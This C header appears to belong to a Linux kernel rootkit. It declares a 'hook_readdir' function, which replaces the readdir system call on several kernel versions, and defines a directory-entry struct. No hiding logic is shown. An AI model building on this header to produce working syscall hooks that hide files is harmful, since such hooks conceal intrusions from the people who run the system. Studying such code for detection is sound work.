#ifndef _RK_READDIR_HOOK_H
#define _RK_READDIR_HOOK_H


#include <linux/types.h>
#include <asm/ptrace.h>
#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

struct old_linux_dirent{
    unsigned long d_ino;
    unsigned long d_offset;
    unsigned short d_namelen;
    char d_name[];
};

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_readdir(const struct pt_regs *regs); 
#else
asmlinkage int hook_readdir(unsigned int fd, struct old_linux_dirent* dirp, unsigned int count);
#endif

#endif
